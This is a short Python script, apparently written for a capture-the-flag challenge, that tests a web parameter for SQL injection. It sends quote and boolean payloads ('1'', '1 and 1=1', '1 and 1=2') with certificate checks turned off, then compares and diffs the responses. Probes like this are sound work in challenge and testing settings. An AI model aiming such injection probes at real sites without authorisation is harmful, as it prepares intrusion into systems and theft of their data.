import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.verify = False
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

r1 = s.get(url, params={"id": "1"})
r2 = s.get(url, params={"id": "1'"})
r3 = s.get(url, params={"id": "1 and 1=1"})
r4 = s.get(url, params={"id": "1 and 1=2"})

print("len r1 (1):", len(r1.content))
print("len r2 (1'):", len(r2.content))
print("len r3 (1=1):", len(r3.content))
print("len r4 (1=2):", len(r4.content))
print("r1 == r2?:", r1.content == r2.content)
print("r1 == r3?:", r1.content == r3.content)
print("r1 == r4?:", r1.content == r4.content)
if r1.content != r2.content:
    import difflib
    print("Diff r1 vs r2:")
    print("".join(difflib.unified_diff(r1.text.splitlines(True), r2.text.splitlines(True))))
